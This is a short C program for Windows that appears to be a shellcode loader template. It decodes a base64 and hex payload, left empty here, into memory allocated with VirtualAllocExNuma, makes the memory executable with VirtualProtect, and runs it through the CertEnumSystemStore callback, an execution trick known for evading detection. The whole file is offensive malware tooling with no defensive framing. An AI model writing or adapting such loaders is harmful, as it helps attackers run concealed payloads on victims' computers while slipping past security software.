#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include "base64.h"


// Requires Crypt32.lib

char Ciphertext[] = "";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	int len = 0;
	char text[3000] = { 0 };
	base64_decode(Ciphertext, (int)strlen(Ciphertext), text, &len);

	unsigned int char_in_hex;
	char *shellcode = text;
	unsigned int iterations = strlen(shellcode);

	for (unsigned int i = 0; i < iterations - 1; i++) {
		sscanf_s(shellcode + 2 * i, "%2X", &char_in_hex);
		shellcode[i] = (char)char_in_hex;
	}

	RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)addr);


}